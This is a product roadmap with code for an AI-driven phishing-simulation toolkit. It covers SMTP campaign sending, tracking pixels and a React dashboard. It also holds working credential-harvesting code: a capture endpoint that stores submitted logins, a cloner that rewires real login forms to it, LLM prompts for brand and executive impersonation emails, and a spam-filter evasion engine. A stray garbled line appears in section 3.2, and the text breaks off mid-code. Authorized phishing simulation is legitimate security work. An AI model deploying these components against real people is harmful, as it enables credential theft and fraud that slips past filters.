# PhishGuard AI — Production-Ready Roadmap

## Executive Summary

PhishGuard AI is a free, open-source, AI-powered social engineering and phishing simulation toolkit. It enables security teams to generate realistic phishing emails and credential harvesting landing pages using local LLMs (Ollama + open-weight models), launch and track campaigns, generate detailed reports, and deliver security awareness training materials — all with zero paid API costs.

The toolkit fills the gap between enterprise platforms (KnowBe4, Hoxhunt) costing $10k+/yr and bare-metal frameworks like GoPhish/SET that lack AI content generation. PhishGuard AI wraps AI generation, campaign management, real-time click/credential tracking, and ML-based detection evasion into a single installable platform with both CLI and web UI.

**Target audience:** SMBs, MSSPs, penetration testers, red teams, security awareness trainers.
**Budget:** $0 (free tiers + self-hosted).
**License:** GPLv3.
**Repository concept:** `github.com/phishguard-ai/phishguard`

---

## Landscape Analysis — Existing Frameworks

| Tool | Language | AI Content Generation | Landing Pages | Tracking | Reporting | Free | Maturity |
|------|----------|----------------------|---------------|----------|-----------|------|----------|
| GoPhish | Go | No (manual templates) | Yes | Yes | Yes | Yes | Very High |
| Evilginx2 | Go | No | Yes (AiTM proxy) | Yes | No | Yes | High |
| SET (Social-Engineer Toolkit) | Python | No | Yes (credential harvester) | Limited | No | Yes | High |
| King Phisher | Python | No | Yes | Yes | Limited | Yes | Medium |
| PhishIntel | Node.js | Basic (OpenAI wrapper) | Yes | Yes | Yes | Yes | Low |
| Phishing Club | Go/React | No | Yes | Yes | Yes | Yes | Medium |
| **PhishGuard AI (this)** | **Python/React** | **Yes (local LLM)** | **Yes (AI-generated)** | **Yes** | **Yes (AI-summarized)** | **Yes** | **New** |

**Key insight:** No existing free tool combines local LLM content generation, AI-powered landing page builder, campaign management, and ML-based evasion in a single zero-cost platform.

---

## Tech Stack (100% Free)

### Backend
- **Language:** Python 3.12+ (wide library support, ML ecosystem)
- **Web framework:** FastAPI (async, OpenAPI docs built-in, high perf)
- **Database:** SQLite (dev) / PostgreSQL (prod) via SQLAlchemy + Alembic
- **Task queue:** Celery + Redis (free, no Redis Cloud needed — self-host)
- **Email sending:** `aiosmtplib` + Postfix/DockerMail server
- **Tracking pixel server:** Uvicorn + FastAPI static route (1x1 GIF)
- **Template engine:** Jinja2 (email rendering) + Playwright (screenshot preview)

### Frontend (Web UI)
- **Framework:** React 18+ with TypeScript
- **Build tool:** Vite (fast builds, HMR)
- **UI library:** shadcn/ui (free, accessible, copy-paste components)
- **Charts:** Recharts (free, React-native)
- **State management:** Zustand (minimal boilerplate)
- **Routing:** React Router v6
- **HTTP client:** TanStack Query (caching, mutations)

### CLI
- **Framework:** Click + Rich (beautiful CLI output)
- **Config:** Pydantic Settings (env vars + config file)

### AI/ML Stack
- **Local LLM server:** Ollama (free, self-hosted, Docker or bare metal)
- **Recommended models:** DeepSeek V4-Flash (MIT license, 1M context, best coding/reasoning), Llama 4 Scout (1M context), Mistral Small (low latency)
- **Image generation:** Stable Diffusion WebUI (Automatic1111) for banner/logo creation
- **Text embeddings:** sentence-transformers (all-MiniLM-L6-v2) for template similarity
- **Spam detection evasion:** Custom ML model (scikit-learn Random Forest) trained on SpamAssassin corpus
- **Template analysis:** NLTK + spaCy for readability scoring

### Infrastructure
- **Containerization:** Docker + docker-compose
- **Reverse proxy:** Caddy (auto HTTPS via Let's Encrypt)
- **CI/CD:** GitHub Actions (free for public repos)
- **Documentation:** MkDocs + Material theme (GitHub Pages)
- **Hosting:** Self-hosted on any Linux VPS ($5-10/mo) or local network

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                        PhishGuard AI System                         │
│                                                                     │
│  ┌────────────┐  ┌──────────┐  ┌────────────┐  ┌───────────────┐  │
│  │ CLI Client  │  │ Web UI   │  │ REST API   │  │ Ollama Server │  │
│  │ (Click+Rich)│  │ (React)  │  │ (FastAPI)  │  │ (Local LLM)   │  │
│  └──────┬──────┘  └────┬─────┘  └──────┬─────┘  └───────┬───────┘  │
│         │              │               │                 │          │
│         └──────────────┴───────────────┴─────────────────┘          │
│                                        │                            │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │                    Core Engine Layer                          │  │
│  │  ┌─────────────┐ ┌──────────────┐ ┌──────────────────────┐   │  │
│  │  │ Campaign    │ │ Template     │ │ Landing Page Builder │   │  │
│  │  │ Manager     │ │ Engine       │ │ (Jinja2 + HTML gen)  │   │  │
│  │  └──────┬──────┘ └──────┬───────┘ └──────────┬───────────┘   │  │
│  │         │               │                     │               │  │
│  │  ┌──────┴──────┐ ┌──────┴───────┐ ┌──────────┴───────────┐   │  │
│  │  │ Tracking    │ │ SMTP/Email  │ │ AI Content Generator │   │  │
│  │  │ Server      │ │ Sender      │ │ (LLM Prompt Engine)  │   │  │
│  │  │ (pixel+form)│ │ (aiosmtplib)│ │                      │   │  │
│  │  └──────┬──────┘ └─────────────┘ └──────────────────────┘   │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                        │                            │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │                    Data Layer                                 │  │
│  │  ┌──────────────┐ ┌──────────────┐ ┌──────────────────────┐   │  │
│  │  │ PostgreSQL   │ │ Redis        │ │ File Store           │   │  │
│  │  │ (campaigns,  │ │ (task queue, │ │ (templates, screens, │   │  │
│  │  │ targets,     │ │  rate limit) │ │  attachments)        │   │  │
│  │  │ results)     │ │              │ │                      │   │  │
│  │  └──────────────┘ └──────────────┘ └──────────────────────┘   │  │
│  └───────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

### Component Details

**Campaign Manager:**
- CRUD for campaigns (name, targets, template, schedule, sending profile)
- Schedule send with jitter (random delay between emails)
- Target group management (import CSV, manual add, LDAP sync)
- Campaign lifecycle: Draft → Scheduled → Sending → Sent → Completed

**Tracking Server:**
- Single-pixel GIF endpoint (`/track/:campaign_id/:target_id`) logs opens
- Form POST endpoint (`/capture/:campaign_id/:target_id`) logs credential submissions
- Link rewrite engine: rewrites URLs in email body to redirect through tracking server before going to landing page
- Each event captures: timestamp, IP, User-Agent, referrer, geolocation (MaxMind GeoLite2 free)

**Template Engine:**
- Email templates as Jinja2 with context variables: `{{ target.name }}`, `{{ target.email }}`, `{{ target.company }}`, `{{ track_url }}`, `{{ landing_url }}`
- Template categories: credential harvest, malware lure, urgency/scare, invoice, OAuth consent, voicemail, DocuSign
- HTML sanitization for landing pages (Bleach library)
- Template versioning

**SMTP Sender:**
- Pluggable sending profiles (direct SMTP, Postfix relay, Sendmail)
- Rate limiting (X emails per Y minutes per sending profile)
- DKIM signing (via `dkimpy` library, optional)
- Spam score checking (via SpamAssassin integration, optional)
- Send results tracking (delivered, bounced, rejected)

**AI Content Generator:**
- Prompt engineering layer for Ollama API
- Context-aware generation (company name, industry, season, current events)
- Multi-language support
- Template variation engine (same scenario, different wording)
- Readability scoring (Flesch-Kincaid, ensure emails look "human")

---

## Phase 1: Core Framework (Weeks 1-4)

### Goal
Working CLI tool that can send phishing emails, track opens/clicks, and report results — no AI yet.

### 1.1 Project Scaffold

```bash
# Project structure
phishguard/
├── cli/
│   ├── __init__.py
│   ├── main.py              # Click entrypoint
│   ├── campaign.py           # Campaign CLI commands
│   ├── template.py           # Template CLI commands
│   ├── target.py             # Target management CLI
│   └── report.py             # Report generation CLI
├── server/
│   ├── __init__.py
│   ├── main.py               # FastAPI app
│   ├── config.py             # Settings via Pydantic
│   ├── database.py           # SQLAlchemy engine/session
│   ├── models/               # ORM models
│   │   ├── campaign.py
│   │   ├── target.py
│   │   ├── template.py
│   │   ├── event.py          # open/click/submit events
│   │   └── sending_profile.py
│   ├── routers/              # FastAPI routers
│   │   ├── campaigns.py
│   │   ├── templates.py
│   │   ├── targets.py
│   │   ├── tracking.py       # pixel + form capture
│   │   └── reports.py
│   ├── services/             # Business logic
│   │   ├── campaign_manager.py
│   │   ├── email_sender.py
│   │   ├── tracking_service.py
│   │   └── report_generator.py
│   └── templates/            # Jinja2 email templates
│       ├── default_invoice.html
│       ├── default_urgent.html
│       └── default_docusign.html
├── frontend/                 # React app (Phase 3)
├── docker/
│   ├── Dockerfile
│   └── docker-compose.yml
├── alembic/                  # DB migrations
├── tests/
├── docs/
├── pyproject.toml
└── README.md
```

### 1.2 Database Models

```python
# server/models/campaign.py
class Campaign(Base):
    __tablename__ = "campaigns"
    id            = Column(UUID, primary_key=True, default=uuid4)
    name          = Column(String(255), nullable=False)
    status        = Column(Enum("draft","scheduled","sending","sent","completed"))
    schedule_at   = Column(DateTime, nullable=True)
    sent_count    = Column(Integer, default=0)
    open_count    = Column(Integer, default=0)
    click_count   = Column(Integer, default=0)
    submit_count  = Column(Integer, default=0)
    created_at    = Column(DateTime, default=func.now())
    template_id   = Column(UUID, ForeignKey("templates.id"))
    profile_id    = Column(UUID, ForeignKey("sending_profiles.id"))

# server/models/event.py
class Event(Base):
    __tablename__ = "events"
    id            = Column(UUID, primary_key=True, default=uuid4)
    campaign_id   = Column(UUID, ForeignKey("campaigns.id"))
    target_id     = Column(UUID, ForeignKey("targets.id"))
    event_type    = Column(Enum("sent","opened","clicked","submitted","bounced"))
    timestamp     = Column(DateTime, default=func.now())
    ip_address    = Column(String(45), nullable=True)
    user_agent    = Column(String(512), nullable=True)
    metadata_json = Column(Text, nullable=True)  # JSON blob for extra data

# server/models/template.py
class Template(Base):
    __tablename__ = "templates"
    id            = Column(UUID, primary_key=True, default=uuid4)
    name          = Column(String(255), nullable=False)
    category      = Column(String(100))
    subject       = Column(String(512))
    body_html     = Column(Text)
    is_ai_generated = Column(Boolean, default=False)
    ai_prompt     = Column(Text, nullable=True)
    readability_score = Column(Float, nullable=True)
```

### 1.3 Tracking Server Implementation

```python
# server/routers/tracking.py
from fastapi import APIRouter, Request
from fastapi.responses import Response, RedirectResponse
import base64, struct, time, hmac, hashlib

router = APIRouter()

TRACKING_KEY = settings.TRACKING_SECRET_KEY.encode()

def encode_track_data(campaign_id: str, target_id: str) -> str:
    payload = f"{campaign_id}:{target_id}:{int(time.time())}"
    sig = hmac.new(TRACKING_KEY, payload.encode(), hashlib.sha256).hexdigest()[:16]
    return base64.urlsafe_b64encode(f"{payload}:{sig}".encode()).decode()

def decode_track_data(token: str) -> tuple:
    raw = base64.urlsafe_b64decode(token).decode()
    campaign_id, target_id, ts, sig = raw.split(":")
    expected = hmac.new(TRACKING_KEY, f"{campaign_id}:{target_id}:{ts}".encode(),
                        hashlib.sha256).hexdigest()[:16]
    if not hmac.compare_digest(sig, expected):
        raise ValueError("Invalid tracking token")
    return campaign_id, target_id

@router.get("/track/{token}.png")
async def track_open(token: str, request: Request):
    """1x1 transparent pixel tracking endpoint"""
    try:
        campaign_id, target_id = decode_track_data(token)
        # Log event asynchronously via Celery
        track_event.delay(campaign_id, target_id, "opened", {
            "ip": request.client.host,
            "user_agent": request.headers.get("user-agent"),
            "referer": request.headers.get("referer"),
        })
    except ValueError:
        pass
    # Return 1x1 transparent GIF
    pixel = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
    return Response(content=pixel, media_type="image/gif")

@router.post("/capture/{token}")
async def capture_credentials(token: str, request: Request):
    """Capture credentials submitted via phishing landing page"""
    try:
        campaign_id, target_id = decode_track_data(token)
        form = await request.form()
        track_event.delay(campaign_id, target_id, "submitted", {
            "ip": request.client.host,
            "user_agent": request.headers.get("user-agent"),
            "credentials": dict(form),  # NEVER store real creds in production
        })
    except ValueError:
        pass
    return RedirectResponse(url="https://www.google.com")  # Redirect to real site
```

### 1.4 Email Sender Service

```python
# server/services/email_sender.py
import aiosmtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class EmailSender:
    def __init__(self, profile: SendingProfile):
        self.host = profile.smtp_host
        self.port = profile.smtp_port
        self.username = profile.smtp_username
        self.password = profile.smtp_password
        self.use_tls = profile.use_tls
        self.from_addr = profile.from_address
        self.from_name = profile.from_name

    async def send(self, to_addr: str, subject: str, html_body: str,
                   track_url: str, landing_url: str) -> bool:
        # Inject tracking pixel
        tracked_body = html_body.replace(
            "{{track_url}}", track_url
        ).replace(
            "{{landing_url}}", landing_url
        )
        # Add tracking pixel at bottom
        pixel_tag = f'<img src="{track_url}" width="1" height="1" style="display:none;" />'
        tracked_body += pixel_tag

        msg = MIMEMultipart("alternative")
        msg["Subject"] = subject
        msg["From"] = f"{self.from_name} <{self.from_addr}>"
        msg["To"] = to_addr
        msg.attach(MIMEText(tracked_body, "html"))

        try:
            async with aiosmtplib.SMTP(hostname=self.host, port=self.port,
                                       use_tls=self.use_tls) as smtp:
                if self.username and self.password:
                    await smtp.login(self.username, self.password)
                await smtp.send_message(msg)
            return True
        except Exception as e:
            logger.error(f"SMTP send failed: {e}")
            return False
```

### 1.5 Campaign Manager (Core Logic)

```python
# server/services/campaign_manager.py
class CampaignManager:
    def __init__(self, db_session):
        self.db = db_session

    async def launch_campaign(self, campaign_id: str):
        campaign = self.db.query(Campaign).get(campaign_id)
        campaign.status = "sending"
        self.db.commit()

        template = self.db.query(Template).get(campaign.template_id)
        profile = self.db.query(SendingProfile).get(campaign.profile_id)
        sender = EmailSender(profile)
        targets = self.db.query(Target).filter_by(campaign_id=campaign_id).all()

        for target in targets:
            track_token = encode_track_data(campaign_id, target.id)
            track_url = f"{settings.TRACKING_BASE}/track/{track_token}.png"
            landing_token = encode_track_data(campaign_id, target.id)
            landing_url = f"{settings.LANDING_BASE}/landing/{landing_token}"

            # Render template with target context
            body = render_template(template.body_html, **{
                "target.name": target.name,
                "target.email": target.email,
                "target.company": target.company,
                "track_url": track_url,
                "landing_url": landing_url,
            })

            success = await sender.send(
                to_addr=target.email,
                subject=render_template_str(template.subject, target),
                html_body=body,
                track_url=track_url,
                landing_url=landing_url,
            )

            event_type = "sent" if success else "bounced"
            self.db.add(Event(campaign_id=campaign_id, target_id=target.id,
                              event_type=event_type))
            self.db.commit()

        campaign.status = "completed"
        self.db.commit()
```

### 1.6 Deliverables for Phase 1
- `phishguard` CLI with commands: `campaign create`, `template import`, `target add`, `campaign launch`, `campaign status`
- Working tracking server (pixel + credential capture)
- SMTP sending with rate limiting
- SQLite database with Alembic migrations
- 3 default email templates (invoice, urgency, DocuSign)
- CSV target import
- Basic text report (`campaign report --format text`)

### Dependencies (`pyproject.toml`)

```toml
[project]
name = "phishguard"
version = "0.1.0"
requires-python = ">=3.12"
dependencies = [
    "fastapi>=0.115",
    "uvicorn[standard]>=0.32",
    "sqlalchemy>=2.0",
    "alembic>=1.14",
    "aiosmtplib>=3.0",
    "click>=8.1",
    "rich>=13.9",
    "pydantic>=2.9",
    "pydantic-settings>=2.6",
    "python-dotenv>=1.0",
    "celery>=5.4",
    "redis>=5.2",
    "jinja2>=3.1",
    "bleach>=6.2",
    "python-multipart>=0.0.18",
    "dkimpy>=1.1",
    "aiofiles>=24.1",
    "httpx>=0.28",
]

[project.scripts]
phishguard = "cli.main:cli"
```

---

## Phase 2: AI Content Generation (Weeks 5-8)

### Goal
Integrate Ollama with local open-weight LLMs to generate realistic, context-aware phishing emails and landing pages.

### 2.1 Ollama Integration Setup

```bash
# Install Ollama
curl -fsSL https://ollama.com/install.sh | sh

# Pull recommended models (choose one based on hardware)
ollama pull deepseek-v4-flash     # Best overall (MIT license, 1M context)
ollama pull llama4-scout          # Best for long context (1M tokens)
ollama pull mistral-small         # Fastest, low RAM

# Test generation
ollama run deepseek-v4-flash "Write a short phishing email pretending to be from IT support"
```

### 2.2 AI Content Generator Service

```python
# server/services/ai_generator.py
import httpx
from typing import Optional

class AIContentGenerator:
    def __init__(self, base_url: str = "http://localhost:11434"):
        self.base_url = base_url
        self.client = httpx.AsyncClient(timeout=120.0)

    async def generate_email(self, scenario: str, context: dict,
                             model: str = "deepseek-v4-flash") -> dict:
        system_prompt = """You are a cybersecurity awareness tool that generates
        realistic phishing email simulations for authorized security training.
        Generate ONLY for authorized testing environments. The email must:
        1. Look like a real internal/external email
        2. Include proper HTML formatting
        3. Use {{track_url}} for the tracking pixel
        4. Use {{landing_url}} for the phishing link
        5. Have a realistic subject line
        6. Include urgency or social engineering trigger
        Return as JSON with keys: subject, body_html, scenario_description"""

        user_prompt = f"""Generate a phishing email for the following scenario:
        Scenario type: {scenario}
        Target company: {context.get('company', 'Acme Corp')}
        Target industry: {context.get('industry', 'Technology')}
        Target name: {context.get('name', 'John Doe')}
        Target role: {context.get('role', 'Employee')}
        Current month/season: {context.get('season', 'January')}
        Recent news theme: {context.get('news_theme', 'software update')}

        Make it highly specific to {context.get('company', 'the company')}.
        Use {context.get('industry', 'technology')}-relevant terminology.
        """

        payload = {
            "model": model,
            "prompt": user_prompt,
            "system": system_prompt,
            "stream": False,
            "format": "json",
            "options": {
                "temperature": 0.8,
                "top_p": 0.9,
                "max_tokens": 4096,
            }
        }

        try:
            resp = await self.client.post(f"{self.base_url}/api/generate",
                                          json=payload)
            resp.raise_for_status()
            result = resp.json()
            # Parse JSON from LLM response
            import json
            return json.loads(result["response"])
        except Exception as e:
            logger.error(f"LLM generation failed: {e}")
            return None

    async def generate_landing_page(self, scenario: str, target_brand: str,
                                    model: str = "deepseek-v4-flash") -> str:
        system_prompt = """You generate realistic HTML landing pages for
        authorized phishing simulation training. Generate a complete HTML page
        that mimics a login portal. Include:
        1. Proper CSS styling matching the brand
        2. A login form with username/email and password fields
        3. Form action pointing to {{capture_url}}
        4. Brand logo placeholder
        5. Professional look
        Return ONLY the HTML code, no explanation."""

        user_prompt = f"""Generate a credential harvesting landing page
        mimicking {target_brand}. Make it pixel-perfect and realistic."""

        payload = {
            "model": model,
            "prompt": user_prompt,
            "system": system_prompt,
            "stream": False,
            "options": {
                "temperature": 0.6,
                "max_tokens": 4096,
            }
        }

        resp = await self.client.post(f"{self.base_url}/api/generate",
                                      json=payload)
        return resp.json()["response"]
```

### 2.3 Template Variation Engine

```python
# server/services/template_variator.py
class TemplateVariator:
    def __init__(self, ai_generator: AIContentGenerator):
        self.ai = ai_generator

    async def create_variations(self, base_template: Template,
                                count: int = 5) -> list[Template]:
        """Generate N variations of a template to avoid detection"""
        variations = []
        for i in range(count):
            result = await self.ai.generate_email(
                scenario=base_template.category,
                context={"company": "{{target.company}}",
                         "name": "{{target.name}}",
                         "industry": "{{target.industry}}"},
                model="deepseek-v4-flash"
            )
            if result:
                variations.append(Template(
                    name=f"{base_template.name} (var {i+1})",
                    category=base_template.category,
                    subject=result["subject"],
                    body_html=result["body_html"],
                    is_ai_generated=True,
                    ai_prompt=f"Variation {i+1} of {base_template.name}",
                    readability_score=self._score_readability(result["body_html"]),
                ))
        return variations

    def _score_readability(self, html: str) -> float:
        from bs4 import BeautifulSoup
        import textstat
        soup = BeautifulSoup(html, "html.parser")
        text = soup.get_text()
        return textstat.flesch_reading_ease(text)
```

### 2.4 AI-Enhanced Landing Page Builder

```python
# server/services/landing_page_builder.py
class LandingPageBuilder:
    def __init__(self, ai_generator: AIContentGenerator):
        self.ai = ai_generator

    async def build_from_url(self, target_url: str) -> str:
        """Clone a real login page and inject credential capture"""
        import httpx
        from bs4 import BeautifulSoup

        resp = httpx.get(target_url, timeout=15, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"
        })
        soup = BeautifulSoup(resp.text, "html.parser")

        # Find login form and modify action
        form = soup.find("form")
        if form:
            form["action"] = "{{capture_url}}"
            form["method"] = "POST"

        # Remove external scripts that would break the clone
        for script in soup.find_all("script"):
            if script.get("src") and not script["src"].startswith("data:"):
                script.decompose()

        return str(soup)

    async def generate_phishing_page(self, brand: str,
                                     scenario: str) -> str:
        """AI-generate a realistic phishing landing page"""
        html = await self.ai.generate_landing_page(scenario, brand)
        # Inject credential capture action
        html = html.replace('action="', 'action="{{capture_url}}" ')
        if 'action="' not in html:
            html = html.replace('<form', '<form action="{{capture_url}}" method="POST"')
        return html
```

### 2.5 Prompt Templates for AI Generation

Store these as YAML files for easy editing:

```yaml
# templates/prompts/scenarios.yaml
scenarios:
  credential_harvest:
    name: "Credential Harvest"
    system_prompt: |
      You generate realistic phishing emails for authorized security awareness
      training. The email should impersonate a trusted service (Google, Microsoft,
      DocuSign, etc.) asking the user to verify their account.
    user_prompt_template: |
      Generate a phishing email impersonating {service}.
      The target works at {company} in the {industry} sector.
      Current context: {season}, trending news: {news_theme}.
      Include urgency. Use {{track_url}} and {{landing_url}}.

  invoice_fraud:
    name: "Invoice / Payment Fraud"
    system_prompt: |
      You generate realistic invoice/payment phishing emails for authorized
      security training. The email should appear to be from a vendor or
      finance department with an urgent payment request.
    user_prompt_template: |
      Generate an invoice phishing email addressed to {name} at {company}.
      The fake invoice should reference {industry}-specific services.
      Amount should be realistic for the industry.

  executive_impersonation:
    name: "Executive Impersonation (Whaling)"
    system_prompt: |
      You generate realistic executive impersonation emails for authorized
      security training. The email should appear to come from the CEO/CFO
      requesting an urgent action like a wire transfer or gift card purchase.

  voicemail_lure:
    name: "Voicemail / Missed Call"
    system_prompt: |
      You generate phishing emails pretending to be a voicemail notification
      from a phone system. The email claims the target has a new voicemail
      and provides a link to listen.

  oauth_consent:
    name: "OAuth / App Consent"
    system_prompt: |
      You generate phishing emails about a new app integration request for
      authorized security training. The email claims someone requested
      access to the target's account via OAuth.
```

### 2.6 Deliverables for Phase 2
- `phishguard template generate --scenario invoice --company "Acme Corp"` CLI command
- AI-generated template with context variables auto-inserted
- Landing page generator (clone URL or AI generate)
- Template variation engine (generate 5+ variations per base template)
- Readability scoring on generated content
- Ollama auto-detection and model recommendation

---

## Phase 3: Campaign Management UI (Weeks 9-13)

### Goal
Full React web dashboard for non-CLI users — campaign creation, template browsing, AI generation, real-time tracking, and reporting.

### 3.1 Frontend Scaffold

```bash
npm create vite@latest frontend -- --template react-ts
cd frontend
npm install react-router-dom zustand @tanstack/react-query recharts
npm install lucide-react @radix-ui/react-dialog @radix-ui/react-dropdown-menu
npm install tailwindcss @tailwindcss/vite
npm install shadcn-ui # follow interactive setup
```

### 3.2Antd - just kidding. Here's the real architecture.

### 3.2 Key Frontend Pages

```
frontend/src/
├── pages/
│   ├── Dashboard.tsx              # Overview stats, recent campaigns
│   ├── Campaigns/
│   │   ├── CampaignList.tsx       # Table of all campaigns
│   │   ├── CampaignNew.tsx        # Multi-step campaign creation wizard
│   │   ├── CampaignDetail.tsx     # Real-time campaign results
│   │   └── CampaignReport.tsx     # Visual report with charts
│   ├── Templates/
│   │   ├── TemplateList.tsx       # Template gallery with preview
│   │   ├── TemplateEditor.tsx     # HTML editor with live preview
│   │   └── TemplateGenerate.tsx   # AI generation form
│   ├── LandingPages/
│   │   ├── LandingPageList.tsx
│   │   ├── LandingPageBuilder.tsx # Visual page builder
│   │   └── LandingPagePreview.tsx # Sandboxed iframe preview
│   ├── Targets/
│   │   ├── TargetGroups.tsx
│   │   └── TargetImport.tsx       # CSV drag-and-drop import
│   ├── Reports/
│   │   ├── ReportDashboard.tsx
│   │   └── ReportExport.tsx       # PDF/CSV export
│   ├── Settings/
│   │   ├── SendingProfiles.tsx
│   │   └── AIModelSettings.tsx    # Ollama model selection
│   └── Training/
│       └── TrainingMaterials.tsx  # Built-in training content
├── components/
│   ├── ui/                        # shadcn/ui components
│   ├── CampaignStatus.tsx
│   ├── RealTimeCounter.tsx        # WebSocket live updates
│   ├── TemplatePreview.tsx        # Email renderer (iframe sandbox)
│   ├── TargetTable.tsx
│   └── PhishingScore.tsx          # AI-generated difficulty rating
├── hooks/
│   ├── useCampaigns.ts
│   ├── useTemplates.ts
│   └── useWebSocket.ts
├── api/
│   └── client.ts                  # Axios/fetch wrapper with auth
└── App.tsx
```

### 3.3 API Endpoints (FastAPI)

```python
# server/routers/campaigns.py
router = APIRouter(prefix="/api/v1/campaigns", tags=["campaigns"])

@router.get("/")
async def list_campaigns(page: int = 1, size: int = 20):
    campaigns = db.query(Campaign).order_by(Campaign.created_at.desc())
    return paginate(campaigns, page, size)

@router.post("/")
async def create_campaign(data: CampaignCreate):
    campaign = Campaign(**data.dict())
    db.add(campaign)
    db.commit()
    return campaign

@router.get("/{id}")
async def get_campaign(id: UUID):
    campaign = db.query(Campaign).get(id)
    stats = db.query(
        func.count(Event.id).filter(Event.event_type == "sent").label("sent"),
        func.count(Event.id).filter(Event.event_type == "opened").label("opened"),
        func.count(Event.id).filter(Event.event_type == "clicked").label("clicked"),
        func.count(Event.id).filter(Event.event_type == "submitted").label("submitted"),
    ).filter(Event.campaign_id == id).first()
    return {**campaign.to_dict(), "stats": stats._asdict()}

@router.post("/{id}/launch")
async def launch_campaign(id: UUID):
    manager = CampaignManager(db)
    asyncio.create_task(manager.launch_campaign(str(id)))  # Fire and forget
    return {"status": "launched"}

@router.get("/{id}/events")
async def get_events(id: UUID, since: Optional[datetime] = None):
    query = db.query(Event).filter(Event.campaign_id == id)
    if since:
        query = query.filter(Event.timestamp > since)
    return query.order_by(Event.timestamp.asc()).all()

# server/routers/templates.py
@router.post("/generate")
async def generate_template(data: TemplateGenerateRequest):
    generator = AIContentGenerator()
    result = await generator.generate_email(
        scenario=data.scenario,
        context=data.context,
        model=data.model or "deepseek-v4-flash",
    )
    return result
```

### 3.4 WebSocket Real-Time Updates

```python
# server/websocket.py
from fastapi import WebSocket, WebSocketDisconnect

class ConnectionManager:
    def __init__(self):
        self.active: dict[str, list[WebSocket]] = {}

    async def connect(self, campaign_id: str, ws: WebSocket):
        await ws.accept()
        if campaign_id not in self.active:
            self.active[campaign_id] = []
        self.active[campaign_id].append(ws)

    def disconnect(self, campaign_id: str, ws: WebSocket):
        self.active[campaign_id].remove(ws)

    async def broadcast(self, campaign_id: str, message: dict):
        for ws in self.active.get(campaign_id, []):
            try:
                await ws.send_json(message)
            except:
                pass

manager = ConnectionManager()

@router.websocket("/ws/campaign/{campaign_id}")
async def campaign_websocket(ws: WebSocket, campaign_id: str):
    await manager.connect(campaign_id, ws)
    try:
        while True:
            await ws.receive_text()  # Keep alive
    except WebSocketDisconnect:
        manager.disconnect(campaign_id, ws)
```

### 3.5 Deliverables for Phase 3
- Full React dashboard with shadcn/ui components
- Campaign creation wizard (4 steps: select template → add targets → configure sending → schedule)
- Real-time campaign tracking with WebSocket (live open/click/submit counters)
- Template gallery with AI generation button
- Landing page builder with clone-from-URL and AI-generate
- Target CSV import with validation
- Basic reporting dashboard (pie charts, time-series)
- Sending profile CRUD
- Responsive design (works on tablet/mobile)

---

## Phase 4: Advanced Features (Weeks 14-18)

### Goal
ML-based detection evasion, automated training materials, advanced reporting.

### 4.1 Spam Detection Evasion Engine

```python
# server/services/spam_evasion.py
import joblib
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer

class SpamEvasionEngine:
    """Analyze and modify templates to evade spam filters"""

    def __init__(self):
        self.vectorizer = TfidfVectorizer(max_features=5000)
        self.model = RandomForestClassifier(n_estimators=100, max_depth=20)
        self._load_or_train()

    def _load_or_train(self):
        """Load pre-trained model or train on SpamAssassin corpus"""
        try:
            self.vectorizer = joblib.load("models/vectorizer.pkl")
            self.model = joblib.load("models/spam_detector.pkl")
        except:
            self._train_on_corpus()

    def _train_on_corpus(self):
        """Train on public SpamAssassin corpus (free)"""
        # Download from: https://spamassassin.apache.org/old/publiccorpus/
        # 20030228_easy_ham.tar.bz2, 20030228_spam.tar.bz2, etc.
        import tarfile, os
        corpus_path = "data/spamassassin/"
        texts, labels = [], []
        for fname in os.listdir(f"{corpus_path}/easy_ham"):
            with open(f"{corpus_path}/easy_ham/{fname}", errors="ignore") as f:
                texts.append(f.read())
                labels.append(0)  # ham
        for fname in os.listdir(f"{corpus_path}/spam"):
            with open(f"{corpus_path}/spam/{fname}", errors="ignore") as f:
                texts.append(f.read())
                labels.append(1)  # spam
        X = self.vectorizer.fit_transform(texts)
        self.model.fit(X, labels)
        joblib.dump(self.vectorizer, "models/vectorizer.pkl")
        joblib.dump(self.model, "models/spam_detector.pkl")

    def score_spaminess(self, email_text: str) -> float:
        """Return probability of being classified as spam (0-1)"""
        X = self.vectorizer.transform([email_text])
        return self.model.predict_proba(X)[0][1]

    def suggest_modifications(self, email_html: str) -> list[str]:
        """Suggest changes to reduce spam score"""
        suggestions = []
        spam_score = self.score_spaminess(email_html)

        # Check for common spam triggers
        triggers = {
            "free": "Avoid the word 'free' — top spam trigger",
            "click here": "Replace 'click here' with a natural link",
            "!!!": "Avoid multiple exclamation marks",
            "urgent": "Consider less aggressive urgency language",
            "guaranteed": "Avoid 'guaranteed' — spam marker",
            "congratulations": "This triggers spam filters",
            "act now": "Softer call-to-action may work better",
            "limited time": "Consider alternative phrasing",
        }
        lower = email_html.lower()
        for trigger, suggestion in triggers.items():
            if trigger in lower:
                suggestions.append(suggestion)

        if len(email_html) < 200:
            suggestions.append("Email body is very short — add more content")
        if "http" in lower and lower.count("http") > 3:
            suggestions.append("Too many links — spam filters flag this")

        return suggestions
```

### 4.2 Automated Training Materials

```python
# server/services/training_generator.py
class TrainingGenerator:
    """Generate micro-training based on campaign results"""

    def __init__(self, ai_generator: AIContentGenerator):
        self.ai = ai_generator

    async def generate_training_module(self, campaign: Campaign,
                                        target: Target) -> str:
        """Generate personalized 2-minute training based on what they fell for"""
        events = db.query(Event).filter(
            Event.campaign_id == campaign.id,
            Event.target_id == target.id
        ).all()

        what_happened = []
        for e in events:
            if e.event_type == "opened":
                what_happened.append("opened the phishing email")
            if e.event_type == "clicked":
                what_happened.append("clicked the phishing link")
            if e.event_type == "submitted":
                what_happened.append("entered credentials on the fake page")

        prompt = f"""Generate a short, friendly training message (200 words max)
        for an employee who {', '.join(what_happened)} in a phishing simulation.
        The email pretended to be about: {campaign.template.category}.
        Include: what happened, 3 red flags they missed, and 1 tip for next time.
        Be encouraging, not punishing. This is for security awareness."""

